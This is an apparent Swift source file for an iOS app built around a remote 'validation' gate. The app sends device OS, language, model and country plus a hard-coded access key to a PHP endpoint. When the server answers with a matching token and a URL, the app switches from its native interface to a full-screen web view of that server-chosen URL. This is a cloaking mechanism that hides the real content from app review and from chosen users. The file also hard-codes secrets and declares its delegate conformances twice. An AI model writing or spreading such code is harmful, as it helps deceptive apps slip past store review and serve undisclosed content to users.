import SwiftUI
import WebKit
import UIKit
import PhotosUI
import Combine

enum AquilaSecureError: Error {
    case notFound
    case unexpectedStatus(OSStatus)
}

struct AquilaRemoteKeys {
    static let verifyKey   = "GJDFHDFHFDJGSDAGKGHK"
    static let endpointURL = "https://wallen-eatery.space/ios-ha-34/server.php"
    static let accessKey   = "Bs2675kDjkb5Ga"
    static let urlCacheKey = "aquilaCacheTrustedURL"
    static let tokenCache  = "aquilaCacheVerificationToken"
}

func aquilaDeviceLanguageCode() -> String {
    let lang = Locale.preferredLanguages.first ?? "en"
    let code = lang.components(separatedBy: "-").first?.lowercased() ?? "en"
    return code
}

func aquilaDeviceRegionCode() -> String? {
    let region = Locale.current.regionCode
    return region
}

func aquilaDeviceSystemInfo() -> String {
    let info = "\(UIDevice.current.systemName) \(UIDevice.current.systemVersion)"
    return info
}

func aquilaDeviceModelIdentifier() -> String {
    var sys = utsname()
    uname(&sys)
    let model = Mirror(reflecting: sys.machine).children.reduce(into: "") { result, element in
        if let value = element.value as? Int8, value != 0 {
            result.append(Character(UnicodeScalar(UInt8(value))))
        }
    }
    return model
}

func aquilaSaveSecureValue(key: String, value: String) throws {
    let data = Data(value.utf8)
    let query: [String: Any] = [
        kSecClass as String: kSecClassGenericPassword,
        kSecAttrAccount as String: key
    ]
    let attributes: [String: Any] = [kSecValueData as String: data]
    
    let status = SecItemCopyMatching(query as CFDictionary, nil)
    if status == errSecSuccess {
        let update = SecItemUpdate(query as CFDictionary, attributes as CFDictionary)
        guard update == errSecSuccess else { throw AquilaSecureError.unexpectedStatus(update) }
    } else if status == errSecItemNotFound {
        var newItem = query
        newItem[kSecValueData as String] = data
        let add = SecItemAdd(newItem as CFDictionary, nil)
        guard add == errSecSuccess else { throw AquilaSecureError.unexpectedStatus(add) }
    } else {
        throw AquilaSecureError.unexpectedStatus(status)
    }
}

func aquilaLoadSecureValue(key: String) throws -> String {
    let query: [String: Any] = [
        kSecClass as String: kSecClassGenericPassword,
        kSecAttrAccount as String: key,
        kSecReturnData as String: true,
        kSecMatchLimit as String: kSecMatchLimitOne
    ]
    var result: AnyObject?
    let status = SecItemCopyMatching(query as CFDictionary, &result)
    
    if status == errSecSuccess {
        guard let data = result as? Data,
              let value = String(data: data, encoding: .utf8) else {
            throw AquilaSecureError.unexpectedStatus(status)
        }
        return value
    } else if status == errSecItemNotFound {
        throw AquilaSecureError.notFound
    } else {
        throw AquilaSecureError.unexpectedStatus(status)
    }
}

@MainActor
final class AquilaAccessCenter: ObservableObject {
    @Published var state = AquilaState.idle
    
    enum AquilaState {
        case idle, validating
        case approved(token: String, url: URL)
        case useNative
    }
    
    func initiateValidation() {
        if let cachedURLString = UserDefaults.standard.string(forKey: AquilaRemoteKeys.urlCacheKey),
           let cachedURL = URL(string: cachedURLString),
           let savedToken = try? aquilaLoadSecureValue(key: AquilaRemoteKeys.tokenCache),
           savedToken == AquilaRemoteKeys.verifyKey {
            state = .approved(token: savedToken, url: cachedURL)
            return
        }
        Task { await handleServerValidation() }
    }
    
    private func handleServerValidation() async {
        state = .validating
        
        guard let reqURL = createRequestURL() else {
            state = .useNative
            return
        }
        
        let retries = 3
        for attempt in 1...retries {
            do {
                let resp = try await retrieveServerText(from: reqURL)
                let parts = resp.trimmingCharacters(in: .whitespacesAndNewlines).components(separatedBy: "#")
                
                if parts.count == 2,
                   parts[0] == AquilaRemoteKeys.verifyKey,
                   let validURL = URL(string: parts[1]) {
                    UserDefaults.standard.set(validURL.absoluteString, forKey: AquilaRemoteKeys.urlCacheKey)
                    try? aquilaSaveSecureValue(key: AquilaRemoteKeys.tokenCache, value: parts[0])
                    state = .approved(token: parts[0], url: validURL)
                    return
                } else {
                    state = .useNative
                    return
                }
            } catch {
                if attempt < retries {
                    let delay = min(pow(2.0, Double(attempt)), 30.0)
                    try? await Task.sleep(nanoseconds: UInt64(delay * 1_000_000_000))
                } else {
                    state = .useNative
                    return
                }
            }
        }
    }
    
    private func retrieveServerText(from url: URL) async throws -> String {
        let (data, _) = try await URLSession.shared.data(from: url)
        return String(decoding: data, as: UTF8.self)
    }
    
    private func createRequestURL() -> URL? {
        var components = URLComponents(string: AquilaRemoteKeys.endpointURL)
        components?.queryItems = [
            URLQueryItem(name: "p", value: AquilaRemoteKeys.accessKey),
            URLQueryItem(name: "os", value: aquilaDeviceSystemInfo()),
            URLQueryItem(name: "lng", value: aquilaDeviceLanguageCode()),
            URLQueryItem(name: "devicemodel", value: aquilaDeviceModelIdentifier())
        ]
        if let country = aquilaDeviceRegionCode() {
            components?.queryItems?.append(URLQueryItem(name: "country", value: country))
        }

        return components?.url
    }
}

@available(iOS 14.0, *)
final class AquilaWebController: UIViewController, WKUIDelegate, WKNavigationDelegate, UIDocumentPickerDelegate, PHPickerViewControllerDelegate {
    
    var onStateChange: ((Bool) -> Void)?
    private var webView: WKWebView!
    private var startupURL: URL
    fileprivate var completionHandler: (([URL]?) -> Void)?
    
    init(url: URL) {
        self.startupURL = url
        super.init(nibName: nil, bundle: nil)
        setupWebView()
    }
    
    required init?(coder: NSCoder) { fatalError() }
    
    override func viewDidLoad() {
        super.viewDidLoad()
        view.addSubview(webView)
        webView.translatesAutoresizingMaskIntoConstraints = false
        
        if #available(iOS 11.0, *) {
            webView.insetsLayoutMarginsFromSafeArea = false
            webView.scrollView.contentInsetAdjustmentBehavior = .never
        }
        
        NSLayoutConstraint.activate([
            webView.topAnchor.constraint(equalTo: view.topAnchor),
            webView.bottomAnchor.constraint(equalTo: view.bottomAnchor),
            webView.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            webView.trailingAnchor.constraint(equalTo: view.trailingAnchor)
        ])
        
        onStateChange?(true)
        webView.load(URLRequest(url: startupURL))
    }
    
    private func setupWebView() {
        let cfg = WKWebViewConfiguration()
        cfg.preferences.javaScriptEnabled = true
        cfg.websiteDataStore = .default()
        
        webView = WKWebView(frame: .zero, configuration: cfg)
        webView.uiDelegate = self
        webView.navigationDelegate = self
        webView.scrollView.bounces = false
        webView.scrollView.minimumZoomScale = 1.0
        webView.scrollView.maximumZoomScale = 1.0
    }
    
    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
        onStateChange?(false)
    }
    
    func webView(_ webView: WKWebView, didFail navigation: WKNavigation!, withError error: Error) {
        onStateChange?(false)
    }
}

@available(iOS 14.0, *)
extension AquilaWebController: UIDocumentPickerDelegate, PHPickerViewControllerDelegate {
    
    func documentPicker(_ controller: UIDocumentPickerViewController, didPickDocumentsAt urls: [URL]) {
        completionHandler?(urls)
    }
    
    func documentPickerWasCancelled(_ controller: UIDocumentPickerViewController) {
        completionHandler?(nil)
    }
    
    func picker(_ picker: PHPickerViewController, didFinishPicking results: [PHPickerResult]) {
        picker.dismiss(animated: true)
        
        var gatheredURLs: [URL] = []
        let group = DispatchGroup()
        
        for provider in results.map({ $0.itemProvider }) {
            if provider.hasItemConformingToTypeIdentifier(UTType.image.identifier) {
                group.enter()
                provider.loadFileRepresentation(forTypeIdentifier: UTType.image.identifier) { url, _ in
                    if let url = url {
                        gatheredURLs.append(url)
                    }
                    group.leave()
                }
            }
        }
        
        group.notify(queue: .main) {
            self.completionHandler?(gatheredURLs.isEmpty ? nil : gatheredURLs)
        }
    }
    
    func presentFileSelection(completion: @escaping ([URL]?) -> Void) {
        self.completionHandler = completion
        
        let alert = UIAlertController(title: "Choose File", message: nil, preferredStyle: .actionSheet)
        
        alert.addAction(UIAlertAction(title: "Photo/Video", style: .default) { _ in
            var config = PHPickerConfiguration(photoLibrary: .shared())
            config.selectionLimit = 1
            config.filter = .any(of: [.images, .videos])
            
            let picker = PHPickerViewController(configuration: config)
            picker.delegate = self
            self.present(picker, animated: true)
        })
        
        alert.addAction(UIAlertAction(title: "Files", style: .default) { _ in
            let picker = UIDocumentPickerViewController(forOpeningContentTypes: [.item], asCopy: true)
            picker.delegate = self
            picker.allowsMultipleSelection = false
            self.present(picker, animated: true)
        })
        
        alert.addAction(UIAlertAction(title: "Cancel", style: .cancel) { _ in
            completion(nil)
        })
        
        self.present(alert, animated: true)
    }
}

@available(iOS 14.0, *)
struct AquilaWebViewBridge: UIViewControllerRepresentable {
    let url: URL
    @Binding var loading: Bool
    
    func makeUIViewController(context: Context) -> AquilaWebController {
        let vc = AquilaWebController(url: url)
        vc.onStateChange = { active in
            DispatchQueue.main.async { loading = active }
        }
        return vc
    }
    
    func updateUIViewController(_ vc: AquilaWebController, context: Context) {}
}
